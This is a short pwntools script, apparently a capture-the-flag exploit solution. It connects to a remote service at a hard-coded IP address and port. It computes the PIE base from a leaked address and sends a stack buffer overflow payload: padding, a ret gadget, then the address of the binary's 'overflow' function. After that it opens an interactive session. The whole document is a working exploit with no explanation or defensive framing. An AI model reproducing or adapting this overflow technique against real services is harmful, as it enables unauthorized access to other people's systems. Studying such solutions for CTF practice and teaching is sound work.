from pwn import *

elf = ELF("./uwu_patched")

context.binary = elf

# p = process(stdout=PIPE)
p = remote("34.124.170.181", 15052)
# gdb.attach(p)

p.recvuntil(b'at: ')
target = int(p.recvline(), 16) - elf.symbols['main']
payload = b'a' * 100 + b'b' * 20 + pack(target + 0x000000000000101a) + pack(target + elf.symbols['overflow'])
p.sendline(payload)

p.interactive()
